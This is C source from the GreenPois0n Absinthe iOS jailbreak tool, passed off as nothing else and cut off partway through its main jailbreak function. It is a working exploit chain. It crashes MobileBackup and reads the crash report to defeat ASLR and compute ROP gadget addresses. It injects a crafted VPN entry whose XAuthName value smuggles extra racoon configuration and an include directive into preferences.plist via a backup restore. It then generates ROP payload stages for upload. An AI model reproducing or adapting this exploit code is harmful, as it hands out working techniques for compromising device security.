/**
 * GreenPois0n Absinthe - jailbreak.c
 * Copyright (C) 2010 Chronic-Dev Team
 * Copyright (C) 2010 Joshua Hill
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <dirent.h>

#include <plist/plist.h>

#include <libimobiledevice/afc.h>
#include <libimobiledevice/sbservices.h>

#include "jailbreak.h"
#include "mb1.h"
#include "fsgen.h"
#include "debug.h"
#include "backup.h"
#include "device.h"
#include "boolean.h"
#include "dictionary.h"
#include "crashreporter.h"
#include "idevicebackup2.h"
#include "idevicepair.h"

#include "dyldcache.h"

#include "offsets.h"

#ifdef WIN32
#include <windows.h>
#define sleep(x) Sleep(x*1000)
#endif

static int quit_flag = 0;

static uint32_t get_libcopyfile_vmaddr(const char* product, const char* build)
{
	// find product type and build version
	int i = 0;
	uint32_t vmaddr = 0;
	while (devices_vmaddr_libcopyfile[i].product) {
		if (!strcmp(product, devices_vmaddr_libcopyfile[i].product) && !strcmp(build, devices_vmaddr_libcopyfile[i].build)) {
			vmaddr = devices_vmaddr_libcopyfile[i].vmaddr;
			break;
		}
		i++;
	}
	return vmaddr;
}

int jb_device_is_supported(const char* product, const char* build)
{
	uint32_t vmaddr = get_libcopyfile_vmaddr(product, build);
	return (vmaddr != 0);
}

int jb_check_consistency(const char* product, const char* build)
{
	return fsgen_check_consistency(build, product);
}

crashreport_t* fetch_crashreport(device_t* device) {
	// We open crashreporter so we can download the mobilebackup2 crashreport
	//  and parse the "random" dylib addresses. Thank you ASLR for nothing. ;P
	debug("Opening connection to CrashReporter service\n");
	crashreporter_t* reporter = crashreporter_connect(device);
	if (reporter == NULL) {
		error("Unable to open connection to crash reporter\n");
		return NULL;
	}

	// Read in the last crash since that's probably our fault anyways. Since dylib
	//  addresses are only randomized on boot, we now have base addresses to
	//  calculate the addresses of our ROP gadgets we need.
	debug("Reading in crash reports from mobile backup\n");
	crashreport_t* crash = crashreporter_last_crash(reporter);
	if (crash == NULL) {
		error("Unable to read last crash\n");
		return NULL;
	}
	crashreporter_free(reporter);
	return crash;
}

crashreport_t* crash_mobilebackup(device_t* device) {
	crashreport_t* crash = NULL;
	mb1_t* mb1 = mb1_connect(device);
	if(mb1) {
		if (mb1_crash(mb1)) {
			fprintf(stderr, "successfully crashed mb1. waiting some time for the device to write the crash report...\n");
			sleep(5);
			crash = fetch_crashreport(device);
		} else {
			fprintf(stderr, "could not crash mb1...\n");
		}
	}
	mb1_free(mb1);
	return crash;
}

/* mkdir helper */
int __mkdir(const char* path, int mode) /*{{{*/
{
#ifdef WIN32
	return mkdir(path);
#else
	return mkdir(path, mode);
#endif
} /*}}}*/

/* recursively remove path, including path */
static void rmdir_recursive(const char *path) /*{{{*/
{
	if (!path) {
		return;
	}
	DIR* cur_dir = opendir(path);
	if (cur_dir) {
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0) || (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}
			char *fpath = (char*)malloc(strlen(path)+1+strlen(ep->d_name)+1);
			if (fpath) {
				struct stat st;
				strcpy(fpath, path);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					rmdir_recursive(fpath);
				} else {
					if (remove(fpath) != 0) {
						debug("could not remove file %s: %s\n", fpath, strerror(errno));
					}
				}
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	if (rmdir(path) != 0) {
		fprintf(stderr, "could not remove directory %s: %s\n", path, strerror(errno));
	}
} /*}}}*/

/* char** freeing helper function */
static void free_dictionary(char **dictionary) /*{{{*/
{
	int i = 0;

	if (!dictionary)
		return;

	for (i = 0; dictionary[i]; i++) {
		free(dictionary[i]);
	}
	free(dictionary);
} /*}}}*/

/* recursively remove path via afc, (incl = 1 including path, incl = 0, NOT including path) */
static int rmdir_recursive_afc(afc_client_t afc, const char *path, int incl) /*{{{*/
{
	char **dirlist = NULL;
	if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
		//fprintf(stderr, "AFC: could not get directory list for %s\n", path);
		return -1;
	}
	if (dirlist == NULL) {
		if (incl) {
			afc_remove_path(afc, path);
		}
		return 0;
	}

	char **ptr;
	for (ptr = dirlist; *ptr; ptr++) {
		if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
			continue;
		}
		char **info = NULL;
		char *fpath = (char*)malloc(strlen(path)+1+strlen(*ptr)+1);
		strcpy(fpath, path);
		strcat(fpath, "/");
		strcat(fpath, *ptr);
		if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
			// failed. try to delete nevertheless.
			afc_remove_path(afc, fpath);
			free(fpath);
			free_dictionary(info);
			continue;
		}

		int is_dir = 0;
		int i;
		for (i = 0; info[i]; i+=2) {
			if (!strcmp(info[i], "st_ifmt")) {
				if (!strcmp(info[i+1], "S_IFDIR")) {
					is_dir = 1;
				}
				break;
			}
		}
		free_dictionary(info);

		if (is_dir) {
			rmdir_recursive_afc(afc, fpath, 0);
		}
		afc_remove_path(afc, fpath);
		free(fpath);
	}

	free_dictionary(dirlist);
	if (incl) {
		afc_remove_path(afc, path);
	}

	return 0;
} /*}}}*/

static int connected = 0;

void jb_device_event_cb(const idevice_event_t *event, void *user_data)
{
	char* uuid = (char*)user_data;
	debug("device event %d: %s\n", event->event, event->uuid);
	if (uuid && strcmp(uuid, event->uuid)) return;
	if (event->event == IDEVICE_DEVICE_ADD) {
		connected = 1;
	} else if (event->event == IDEVICE_DEVICE_REMOVE) {
		connected = 0;
	}
}

static int get_rand(int min, int max) /*{{{*/
{
	int retval = (rand() % (max - min)) + min;
	return retval;
} /*}}}*/

static char *generate_guid() /*{{{*/
{
	char *guid = (char *) malloc(sizeof(char) * 37);
	const char *chars = "ABCDEF0123456789";
	srand(time(NULL));
	int i = 0;

	for (i = 0; i < 36; i++) {
		if (i == 8 || i == 13 || i == 18 || i == 23) {
			guid[i] = '-';
			continue;
		} else {
			guid[i] = chars[get_rand(0, 16)];
		}
	}
	guid[36] = '\0';
	return guid;
} /*}}}*/

static void prefs_remove_entry_if_present(plist_t* pl) /*{{{*/
{
	char* guid = NULL;
	plist_dict_iter iter = NULL;
	plist_t ns = plist_dict_get_item(*pl, "NetworkServices");
	if (!ns || (plist_get_node_type(ns) != PLIST_DICT)) {
		fprintf(stderr, "no NetworkServices node?!\n");
		return;
	}
	plist_dict_new_iter(ns, &iter);
	if (iter) {
		int found = 0;
		plist_t n = NULL;
		char* key = NULL;
		do {
			plist_dict_next_item(ns, iter, &key, &n);
			if (key && (plist_get_node_type(n) == PLIST_DICT)) {
				plist_t uname = plist_dict_get_item(n, "UserDefinedName");
				if (uname && (plist_get_node_type(uname) == PLIST_STRING)) {
					char *uname_str = NULL;
					plist_get_string_val(uname, &uname_str);
					if (uname_str) {
						if (strcmp(uname_str, CONNECTION_NAME) == 0) {
							// entry found
							found++;
							guid = strdup(key);
							printf("removing /NetworkServices/%s (UserDefinedName: %s)\n", key, uname_str);
							plist_dict_remove_item(ns, guid);
						}
						free(uname_str);
					}
				}
			}
			if (key) {
				free(key);
				key = NULL;
			}
		} while (n && !found);
		free(iter);
	}

	if (!guid) {
		// not found. just exit
		fprintf(stderr, "no entry found\n");
		return;
	}

	plist_t sets = plist_dict_get_item(*pl, "Sets");
	if (!sets || (plist_get_node_type(sets) != PLIST_DICT)) {
		fprintf(stderr, "no Sets node?!\n");
		free(guid);
		return;
	}

	iter = NULL;
	plist_dict_new_iter(sets, &iter);
	if (iter) {
		int found = 0;
		plist_t n = NULL;
		char* key = NULL;
		do {
			plist_dict_next_item(sets, iter, &key, &n);
			if (key && (plist_get_node_type(n) == PLIST_DICT)) {
				plist_t nn = plist_access_path(n, 3, "Network", "Service", guid);
				if (nn) {
					nn = plist_access_path(n, 2, "Network", "Service");
					if (nn) {
						fprintf(stderr, "removing /Sets/%s/Network/Service/%s\n", key, guid);
						plist_dict_remove_item(nn, guid);
					}
				}
				nn = plist_access_path(n, 4, "Network", "Global", "IPv4", "ServiceOrder");
				if (nn && (plist_get_node_type(nn) == PLIST_ARRAY)) {
					int32_t num = (int32_t)plist_array_get_size(nn);
					int32_t x;
					for (x = num-1; x >= 0; x--) {
						plist_t nnn = plist_array_get_item(nn, x);
						char* val = NULL;
						if (plist_get_node_type(nnn) == PLIST_KEY) {
							plist_get_key_val(nnn, &val);
						} else if (plist_get_node_type(nnn) == PLIST_STRING) {
							plist_get_string_val(nnn, &val);
						}
						if (val) {
							if (strcmp(val, guid) == 0) {
								free(val);
								fprintf(stderr, "removing /Sets/%s/Network/Global/IPv4/ServiceOrder/%s\n", key, guid);
								plist_array_remove_item(nn, x);
								break;
							}
							free(val);
						}
					}
				}
			}
			if (key) {
				free(key);
				key = NULL;
			}
		} while (n);
		free(iter);
	}
	free(guid);
} /*}}}*/

static void prefs_add_entry(plist_t* pl) /*{{{*/
{
	plist_t dict = NULL;
	plist_t arr = NULL;

	// construct connection data
	plist_t conn = plist_new_dict();

	// DNS
	plist_dict_insert_item(conn, "DNS", plist_new_dict());

	// UserDefinedName
	plist_dict_insert_item(conn, "UserDefinedName", plist_new_string(CONNECTION_NAME));

	// IPv4
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "ConfigMethod", plist_new_string("Automatic"));
	plist_dict_insert_item(dict, "OverridePrimary", plist_new_uint(1));
	plist_dict_insert_item(conn, "IPv4", dict);

	// payload
	plist_dict_insert_item(conn, "com.apple.payload", plist_new_dict());

	// Interface
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "Type", plist_new_string("IPSec"));
	plist_dict_insert_item(conn, "Interface", dict);

	// Proxies
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "FTPPassive", plist_new_uint(1));
	arr = plist_new_array();
	plist_array_append_item(arr, plist_new_string("*.local"));
	plist_array_append_item(arr, plist_new_string("169.254/16"));
	plist_dict_insert_item(dict, "ExceptionList", arr);
	plist_dict_insert_item(conn, "Proxies", dict);

	// IPSec
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "PromptForVPNPIN", plist_new_bool(0));
	plist_dict_insert_item(dict, "AuthenticationMethod", plist_new_string("SharedSecret"));
	plist_dict_insert_item(dict, "OnDemandSupported", plist_new_bool(1));
	plist_dict_insert_item(dict, "OnDemandEnabled", plist_new_uint(1));
	arr = plist_new_array();
	plist_array_append_item(arr, plist_new_string(VPN_TRIGGER_ADDRESS));
	plist_dict_insert_item(dict, "OnDemandMatchDomainsAlways", arr);
	arr = plist_new_array();
	plist_dict_insert_item(dict, "OnDemandMatchDomainsNever", arr);
	arr = plist_new_array();
	plist_dict_insert_item(dict, "OnDemandMatchDomainsOnRetry", arr);
	plist_dict_insert_item(dict, "RemoteAddress", plist_new_string("127.0.0.1"));
	plist_dict_insert_item(dict, "LocalIdentifier", plist_new_string("2"));
	plist_dict_insert_item(dict, "XAuthName", plist_new_string("pod2g\"; proposal {authentication_method xauth_psk_client; hash_algorithm sha1; encryption_algorithm aes 256; lifetime time 3600 sec; dh_group 2;} } include \"/private/var/preferences/SystemConfiguration/com.apple.ipsec.plist"));
	plist_dict_insert_item(dict, "LocalIdentifierType", plist_new_string("KeyID"));
	plist_dict_insert_item(dict, "XAuthEnabled", plist_new_uint(1));
	plist_dict_insert_item(dict, "SharedSecretEncryption", plist_new_string("Key"));
	plist_dict_insert_item(dict, "SharedSecret", plist_new_string("pod2g"));
	plist_dict_insert_item(conn, "IPSec", dict);

	// IPv6
	plist_dict_insert_item(conn, "IPv6", plist_new_dict());

	// get NetworkServices node
	plist_t ns = plist_dict_get_item(*pl, "NetworkServices");
	if (!ns || (plist_get_node_type(ns) != PLIST_DICT)) {
		fprintf(stderr, "ERROR: no NetworkServices node?!\n");
		return;
	}

	// get current set
	plist_t cset = plist_dict_get_item(*pl, "CurrentSet");
	if (!cset || (plist_get_node_type(cset) != PLIST_STRING)) {
		fprintf(stderr, "ERROR: no CurrentSet node found\n");
		return;
	}

	char* curset = NULL;
	plist_get_string_val(cset, &curset);
	if (!curset || (memcmp(curset, "/Sets/", 6) != 0)) {
		fprintf(stderr, "ERROR: CurrentSet has unexpected string value '%s'\n", (curset) ? "(null)" : curset);
		if (curset) {
			free(curset);
		}
		return;
	}

	// locate /Sets/{SetGUID}/Network/Service node
	plist_t netsvc = plist_access_path(*pl, 4, "Sets", curset+6, "Network", "Service");
	if (!netsvc) {
		fprintf(stderr, "ERROR: Could not access /Sets/%s/Network/Service node\n", curset+6);
		free(curset);
		return;
	}

	// locate /Sets/{SetGUID}/Network/Global/IPv4/ServiceOrder node
	plist_t order = plist_access_path(*pl, 6, "Sets", curset+6, "Network", "Global", "IPv4", "ServiceOrder");
	if (!order) {
		fprintf(stderr, "ERROR: Could not access /Sets/%s/Network/Global/IPv4/ServiceOrder node\n", curset+6);
		free(curset);
		return;
	}
	free(curset);

	// make sure we don't have a collision (VERY unlikely, but how knows)
	char* guid = generate_guid();
	while (plist_dict_get_item(ns, guid)) {
		free(guid);
		guid = generate_guid();
	}

	// add connection to /NetworkServices/{GUID}
	plist_dict_insert_item(ns, guid, conn);

	// add {GUID} to /Sets/{SetGUID}/Network/Global/IPv4/ServiceOrder/
	plist_array_append_item(order, plist_new_string(guid));

	// add {GUID} link dict to /Sets/{SetGUID}/Network/Service/
	char *linkstr = malloc(17+strlen(guid)+1);
	strcpy(linkstr, "/NetworkServices/");
	strcat(linkstr, guid);
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "__LINK__", plist_new_string(linkstr));
	free(linkstr);
	plist_dict_insert_item(netsvc, guid, dict);

	// done
	free(guid);
} /*}}}*/

int afc_upload_file2(afc_client_t afc, const char* filename, const char* dstfn)
{
	uint64_t handle = 0;
	char data[0x1000];

	FILE* infile = fopen(filename, "rb");
	if (!infile) {
		error("Unable to open local file %s\n", filename);
		return -1;
	}

	afc_error_t err = afc_file_open(afc, dstfn, AFC_FOPEN_WR, &handle);
	if(err != AFC_E_SUCCESS) {
		error("Unable to open afc://%s\n", dstfn);
		return -1;
	}

	int res = 0;
	while (!feof(infile)) {
		uint32_t bytes_read = fread(data, 1, sizeof(data), infile);
		uint32_t bytes_written = 0;
		if (afc_file_write(afc, handle, data, bytes_read, &bytes_written) != AFC_E_SUCCESS) {
			error("Error writing to file afc://%s\n", dstfn);
			res = -1;
			break;
		}
	}
	afc_file_close(afc, handle);
	fclose(infile);

	return res;
}

int afc_upload_file(afc_client_t afc, const char* filename, const char* todir)
{
#ifdef WIN32
	int i = 0;
	int mfl = strlen(filename);
	char* bn = (char*)filename;
	for (i = mfl-1; i >= 0; i--) {
		if ((bn[i] == '/') || (bn[i] == '\\')) {
			bn = &bn[i+1];
			break;
		}
	}
#else
	char *bn = basename((char*)filename);
#endif
	char *dstfn = (char*)malloc(strlen(todir)+1+strlen(bn)+1);
	strcpy(dstfn, todir);
	strcat(dstfn, "/");
	strcat(dstfn, bn);

        afc_upload_file2(afc, filename, dstfn);
}

void jb_signal_handler(int sig)
{
	quit_flag++;
	idevicebackup2_set_clean_exit(quit_flag);
}

static void afc_free_dictionary(char **dictionary) //ghetto i know, not sure where/how to put a global function for this
{
	int i = 0;

	if (!dictionary)
		return;

	for (i = 0; dictionary[i]; i++) {
		free(dictionary[i]);
	}
	free(dictionary);
}

int jailbreak(const char* uuid, status_cb_t status_cb) {
        char backup_directory[1024];
        tmpnam(backup_directory);

	device_t* device = NULL;

	char* build = NULL;
	char* product = NULL;

	if (!uuid) {
		error("ERROR: missing UUID\n");
		return -1;
	}
	if (!status_cb) {
		error("ERROR: missing status callback\n");
		return -1;
	}

	status_cb("Connecting to device...", 0);

	int retries = 20;
	int i = 0;
	while (!connected && (i++ < retries)) {
		sleep(1);
	}

	if (!connected) {
		status_cb("ERROR: Device connection failed", 0);
		return -1;
	}

	// Open a connection to our device
	debug("Opening connection to device\n");
	device = device_create(uuid);
	if(device == NULL) {
		status_cb("ERROR: Unable to connect to device", 0);
		return -1;
	}

	lockdown_t* lockdown = lockdown_open(device);
	if (lockdown == NULL) {
		status_cb("ERROR: Lockdown connection failed", 0);
		device_free(device);
		return -1;
	}

	if ((lockdown_get_string(lockdown, "ProductType", &product) != LOCKDOWN_E_SUCCESS)
			|| (lockdown_get_string(lockdown, "BuildVersion", &build) != LOCKDOWN_E_SUCCESS)) {
		status_cb("ERROR: Could not get device information", 0);
		if (product) {
			free(product);
		}
		if (build) {
			free(build);
		}
		lockdown_free(lockdown);
		device_free(device);
		return -1;
	}

	// get libcopyfile_vmaddr
	uint32_t libcopyfile_vmaddr = get_libcopyfile_vmaddr(product, build);
	if (libcopyfile_vmaddr == 0) {
		debug("Error: device %s build %s is not supported.\n", product, build);
		status_cb("Sorry, your device is not supported.", 0);
		free(product);
		free(build);
		device_free(device);
		return -1;
	}

	debug("Found libcopyfile.dylib address in database of 0x%x\n", libcopyfile_vmaddr);

	status_cb("Beginning jailbreak, this may take a while...", 2);

	/********************************************************/
	/* start AFC and move dirs out of the way */
	/********************************************************/
	uint16_t port = 0;
	if (lockdown_start_service(lockdown, "com.apple.afc2", &port) == 0) {
                char **fileinfo = NULL;
                uint32_t ffmt = 0;

                afc_client_t afc2 = NULL;
                afc_client_new(device->client, port, &afc2);
                if (afc2) {
                        afc_get_file_info(afc2, "/Applications", &fileinfo);
                        if (fileinfo) {
                                int i;
                                for (i = 0; fileinfo[i]; i += 2) {
                                        if (!strcmp(fileinfo[i], "st_ifmt")) {
                                                if(strcmp(fileinfo[i + 1], "S_IFLNK") == 0)
                                                {
                                                    ffmt = 1;
                                                }
                                                break;
                                        }
                                }
                                afc_free_dictionary(fileinfo);
                                fileinfo = NULL;

                                if(ffmt)
                                {
                                    status_cb("ERROR: Device already jailbroken! Detected stash.", 0);
                                    afc_client_free(afc2);
                                    lockdown_free(lockdown);
                                    device_free(device);
                                    return -1;
                                }
                        }

                        afc_get_file_info(afc2, "/private/etc/launchd.conf", &fileinfo);
                        if (fileinfo) {
                                status_cb("ERROR: Device already jailbroken! Detected untether.", 0);
                                afc_client_free(afc2);
                                lockdown_free(lockdown);
                                device_free(device);
                                return -1;
                        }

	                afc_client_free(afc2);
                }
	}

	if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
		status_cb("ERROR: Failed to start AFC service", 0);
		lockdown_free(lockdown);
		device_free(device);
		return -1;
	}
	lockdown_free(lockdown);
	lockdown = NULL;

	afc_client_t afc = NULL;
	afc_client_new(device->client, port, &afc);
	if (!afc) {
		status_cb("ERROR: Could not connect to AFC service", 0);
		device_free(device);
		return -1;
	}

	status_cb(NULL, 4);

	// check if directory exists
	char** list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		// we're good, directory does not exist.
	} else {
		free_dictionary(list);
		status_cb("Looks like you attempted to apply this Jailbreak and it failed. Will try to fix now...", 0);
		sleep(5);
		goto fix;
	}

	status_cb(NULL, 6);
	afc_make_directory(afc, "/"AFCTMP);

	debug("moving dirs aside...\n");
	afc_rename_path(afc, "/Books", "/"AFCTMP"/Books");
	afc_rename_path(afc, "/DCIM", "/"AFCTMP"/DCIM");
	afc_rename_path(afc, "/PhotoData", "/"AFCTMP"/PhotoData");
	afc_rename_path(afc, "/Photos", "/"AFCTMP"/Photos");
	afc_rename_path(afc, "/Recordings", "/"AFCTMP"/Recordings");
	// TODO other paths?

	afc_client_free(afc);
	afc = NULL;
	device_free(device);
	device = NULL;

	status_cb(NULL, 8);

	/********************************************************/
	/* make backup */
	/********************************************************/
	rmdir_recursive(backup_directory);
	__mkdir(backup_directory, 0755);

	status_cb(NULL, 10);

	char *bargv[] = {
		"idevicebackup2",
		"backup",
		backup_directory,
		NULL
	};
	idevicebackup2(3, bargv);

	backup_t* backup = backup_open(backup_directory, uuid);
	if (!backup) {
		fprintf(stderr, "ERROR: failed to open backup\n");
		return -1;
	}

	/********************************************************/
	/* add vpn on-demand connection to preferences.plist */
	/********************************************************/
	status_cb("Preparing jailbreak files...", 20);

	backup_file_t* bf = NULL;
	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/preferences.plist");
	if (bf) {
		char* fn = backup_get_file_path(backup, bf);
		if (!fn) {
			fprintf(stderr, "Huh, backup path for preferences.plist not found?!\n");
			return -1;
		}

		unsigned char* prefs = NULL;
		uint32_t plen = 0;

		if (file_read(fn, &prefs, &plen) > 8) {
			plist_t pl = NULL;
			if (memcmp(prefs, "bplist00", 8) == 0) {
				plist_from_bin(prefs, plen, &pl);
			} else {
				plist_from_xml(prefs, plen, &pl);
			}
			free(prefs);
			plen = 0;
			prefs = NULL;

			debug("Checking preferences.plist and removing any previous VPN connection\n");
			prefs_remove_entry_if_present(&pl);
			debug("Adding VPN connection entry\n");
			prefs_add_entry(&pl);

			plist_to_bin(pl, (char**)&prefs, &plen);

			backup_file_assign_file_data(bf, prefs, plen, 1);
			free(prefs);
			prefs = NULL;
			backup_file_set_length(bf, plen);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				fprintf(stderr, "ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			fprintf(stderr, "Could not open '%s'\n", fn);
		}
		free(fn);
	} else {
		fprintf(stderr, "ERROR: could not locate preferences.plist in backup.\n");
	}
	backup_file_free(bf);

	/********************************************************/
	/* add a webclip to backup */
	/********************************************************/
	status_cb(NULL, 22);
	if (backup_get_file_index(backup, "HomeDomain", "Library/WebClips") < 0) {
		bf = backup_file_create(NULL);
		backup_file_set_domain(bf, "HomeDomain");
		backup_file_set_path(bf, "Library/WebClips");
		backup_file_set_mode(bf, 040755);
		backup_file_set_inode(bf, 54321);
		backup_file_set_uid(bf, 501);
		backup_file_set_gid(bf, 501);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, 0);
		backup_file_set_flag(bf, 4);
		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		}
		backup_file_free(bf);
	}
	status_cb(NULL, 24);
	bf = backup_get_file(backup, "HomeDomain", "Library/WebClips/corona.webclip");
	if (!bf) {
		bf = backup_file_create(NULL);
		backup_file_set_domain(bf, "HomeDomain");
		backup_file_set_path(bf, "Library/WebClips/corona.webclip");
	}
	if (bf) {
		backup_file_set_mode(bf, 040755);
		backup_file_set_inode(bf, 54322);
		backup_file_set_uid(bf, 501);
		backup_file_set_gid(bf, 501);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, 0);
		backup_file_set_flag(bf, 4);
		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		}
		backup_file_free(bf);
	}

	status_cb(NULL, 26);
	char *info_plist = NULL;
	int info_size = 0;
	file_read("data/common/webclip_Info.plist", (unsigned char**)&info_plist, &info_size);
	bf = backup_file_create_with_data(info_plist, info_size, 0);
	if (bf) {
		backup_file_set_domain(bf, "HomeDomain");
		backup_file_set_path(bf, "Library/WebClips/corona.webclip/Info.plist");
		backup_file_set_mode(bf, 0100644);
		backup_file_set_inode(bf, 54323);
		backup_file_set_uid(bf, 501);
		backup_file_set_gid(bf, 501);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, info_size);
		backup_file_set_flag(bf, 4);
		backup_file_update_hash(bf);

		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		}
		backup_file_free(bf);
		if (info_plist) {
			free(info_plist);
		}
	}

	status_cb(NULL, 28);
	char *icon_data = NULL;
	int icon_size = 0;
	const char *icon_filename;
	if (!strcmp(product, "iPhone4,1") || !strcmp(product, "iPhone3,1") || !strcmp(product, "iPod4,1")) {
		icon_filename = "data/common/webclip_icon@2x.png";
	} else if (strncmp(product, "iPad", 4) == 0) {
		icon_filename = "data/common/webclip_icon-72.png";
	} else {
		icon_filename = "data/common/webclip_icon.png";
	}
	file_read(icon_filename, (unsigned char**)&icon_data, &icon_size);
	bf = backup_file_create_with_data(icon_data, icon_size, 0);
	if (bf) {
		backup_file_set_domain(bf, "HomeDomain");
		backup_file_set_path(bf, "Library/WebClips/corona.webclip/icon.png");
		backup_file_set_mode(bf, 0100644);
		backup_file_set_inode(bf, 54324);
		backup_file_set_uid(bf, 501);
		backup_file_set_gid(bf, 501);
		unsigned int tm = (unsigned int)(time(NULL));
		backup_file_set_time1(bf, tm);
		backup_file_set_time2(bf, tm);
		backup_file_set_time3(bf, tm);
		backup_file_set_length(bf, icon_size);
		backup_file_set_flag(bf, 4);
		backup_file_update_hash(bf);

		if (backup_update_file(backup, bf) < 0) {
			fprintf(stderr, "ERROR: could not add file to backup\n");
		}
		backup_file_free(bf);
	}
	if (icon_data) {
		free(icon_data);
	}
	backup_write_mbdb(backup);
	backup_free(backup);

	/********************************************************/
	/* restore backup */
	/********************************************************/
	status_cb("Sending initial data. Your device will appear to be restoring a backup, this may also take a while...", 30);
	char* rargv[] = {
		"idevicebackup2",
		"restore",
		"--system",
		"--settings",
		"--reboot",
		backup_directory,
		NULL
	};
	idevicebackup2(6, rargv);

	status_cb("Waiting for reboot — not done yet, don't unplug your device yet!", 40);

	/********************************************************/
	/* wait for device reboot */
	/********************************************************/

	// wait for disconnect
	while (connected) {
		sleep(2);
	}
	debug("Device %s disconnected\n", uuid);

	// wait for device to connect
	while (!connected) {
		sleep(2);
	}
	debug("Device %s detected. Connecting...\n", uuid);
	status_cb("Connecting to device...\n", 50);
	sleep(1);

	/********************************************************/
	/* wait for device to finish booting to springboard */
	/********************************************************/
	device = device_create(uuid);
	if (!device) {
		status_cb("ERROR: Could not connect to device. Aborting.", 0);
		// we can't recover since the device connection failed...
		return -1;
	}

	lockdown = lockdown_open(device);
	if (!lockdown) {
		device_free(device);
		status_cb("ERROR: Could not connect to lockdown. Aborting", 0);
		// we can't recover since the device connection failed...
		return -1;
	}

	status_cb("Waiting for device to finish booting...", 55);

	retries = 100;
	int done = 0;
	sbservices_client_t sbsc = NULL;
	plist_t state = NULL;

	while (!done && (retries-- > 0)) {
		port = 0;
		lockdown_start_service(lockdown, "com.apple.springboardservices", &port);
		if (!port) {
			continue;
		}
		sbsc = NULL;
		sbservices_client_new(device->client, port, &sbsc);
		if (!sbsc) {
			continue;
		}
		if (sbservices_get_icon_state(sbsc, &state, "2") == SBSERVICES_E_SUCCESS) {
			plist_free(state);
			state = NULL;
			done = 1;
		}
		sbservices_client_free(sbsc);
		if (done) {
			debug("bootup complete\n");
			break;
		}
		sleep(3);
	}
	lockdown_free(lockdown);
	lockdown = NULL;

	status_cb("Preparing jailbreak data... Do not touch your device yet!", 60);

	sleep(3);

        crashreport_t* crash = NULL;
        while(1)
        {
            debug("Trying to clear crash reports.");

            while(1)
            {
                crashreport_t* old_crash = fetch_crashreport(device);
                if(old_crash == NULL)
                    break;
            }

            /********************************************************/
            /* Crash MobileBackup to grab a fresh crashreport */
            /********************************************************/
            debug("Grabbing a fresh crashreport for this device\n");
            crash = crash_mobilebackup(device);
            if(crash == NULL) {
                    error("Unable to get fresh crash from mobilebackup\n");
                    continue;
            }

            if(crash->pid >= 100 && crash->pid <= 900)
                break;
            else if(crash->pid >= 1000)
                break;
        }

	status_cb(NULL, 70);

	/********************************************************/
	/* calculate DSCS */
	/********************************************************/
	i = 0;
	uint32_t dscs = 0;
	while (crash->dylibs && crash->dylibs[i]) {
		if (!strcmp(crash->dylibs[i]->name, "libcopyfile.dylib")) {
			debug("Found libcopyfile.dylib address in crashreport of 0x%x\n", crash->dylibs[i]->offset);
			dscs = crash->dylibs[i]->offset - libcopyfile_vmaddr;
		}
		i++;
	}
	char pidb[8];
	// Add 15 "processes" here to allow time for the user to click the icon
	unsigned int pid = crash->pid;
	sprintf(pidb, "%d", pid);
	int pidlen = strlen(pidb);
	debug("pid=%d (len=%d)\n", pid, pidlen);

	crashreport_free(crash);
	crash = NULL;

	debug("dscs=0x%x\n", dscs);

	status_cb(NULL, 75);

        char stage1_conf[1024];
        char stage2_conf[1024];

        tmpnam(stage1_conf);
        tmpnam(stage2_conf);

	FILE* f = fopen(stage1_conf, "wb");
	generate_rop(f, 0, build, product, pidlen, dscs);
	fclose(f);

	f = fopen(stage2_conf, "wb");
	generate_rop(f, 1, build, product, pidlen, dscs);
	fclose(f);

	status_cb("Sending payload data, this may take a while... Do not touch your device yet!", 80);

	/********************************************************/
	/* start AFC and add common and device-dependant files */
	/********************************************************/
	lockdown = lockdown_open(device);
	if (!lockdown) {
		device_free(device);
		status_cb("ERROR: Could not connect to lockdown. Aborting", 0);
		// we can't recover since the device connection failed...
		return -1;
	}

	port = 0;
	if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0) {
		status_cb("ERROR: Failed to start AFC service", 0);
		lockdown_free(lockdown);
		device_free(device);
		return -1;
	}
	lockdown_free(lockdown);
	lockdown = NULL;

	afc = NULL;
